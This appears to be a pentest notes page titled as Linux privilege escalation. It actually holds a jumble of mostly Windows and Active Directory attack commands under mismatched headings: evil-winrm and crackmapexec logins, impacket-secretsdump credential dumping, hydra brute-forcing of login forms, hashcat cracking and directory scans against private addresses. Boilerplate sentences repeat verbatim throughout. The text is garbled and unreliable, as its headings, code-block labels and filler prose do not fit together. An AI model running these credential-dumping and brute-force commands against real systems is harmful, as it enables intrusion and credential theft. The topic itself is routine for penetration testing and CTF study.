---
TitleSEO: "Linux Privilege Escalation Techniques | ZureFX"
TitlePost: "Linux Privilege Escalation Techniques"
Author: "ZureFX"
Description: "Personal notes on Linux Privilege Escalation Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "oscp, persistence, enumeration, blue team, malware, linux"
URL: "https://zurefx.github.io/notes/note-linux-privilege-escalation-techniques-796.html"
URL_IMAGES: ""
Date: "2025-05-08"
Tags: "OSCP, Persistence, Enumeration, Blue Team, Malware, Linux"
Section: "notes"
Lang: "en"
main_img: "note-linux-privilege-escalation-techniques-796"
Permalink: "/notes/note-linux-privilege-escalation-techniques-796.html"
BtnLabel: "Read Notes"
Pick: 0
---
## pwncat

### lookupsid

```python
evil-winrm -i 10.103.135.159 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.125.73.101 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p389,25,5432 10.59.176.101 -oN scan.txt
gobuster dir -u http://10.45.210.158/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```bash
crackmapexec smb 10.55.126.50 -u administrator -p 'P@ssw0rd!' --shares
```

```bash
nmap -sCV -p8888,135,21 10.72.49.135 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p443,110,5985 10.21.128.61 -oN scan.txt
```

```python
crackmapexec smb 10.88.13.188 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.44.12.98
crackmapexec smb 10.100.119.125 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.26.111.18/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## enum4linux

### atexec

- `Subdomain Takeover`
- `socat`
- `CORS Misconfiguration`

Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism.

Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory.

Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

## SeImpersonatePrivilege

### RDP

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.32.197.11
```

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges. Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services. The target system was identified as running a vulnerable version of the service.

```python
crackmapexec smb 10.128.62.22 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service. Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

The target system was identified as running a vulnerable version of the service. Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code.

## Subdomain Takeover

### FTP

```bash
evil-winrm -i 10.62.129.103 -u administrator -p 'P@ssw0rd!'
```

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.127.240.140 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.83.33.78
```

- `Sudo Misconfiguration`
- `pwncat`
- `wpscan`

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.88.17.169/FUZZ
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.111.203.221/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.61.66.193/FUZZ
nmap -sCV -p445,587,464 10.95.143.238 -oN scan.txt
```

## Python

### Joomla

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.57.12.66 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.47.47.205 -u administrator -p 'P@ssw0rd!' --shares
```

- `AlwaysInstallElevated`
- `john`
- `SeImpersonatePrivilege`
- `GPP Password`

- `crackmapexec`
- `smbclient`
- `sqlmap`

The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit.
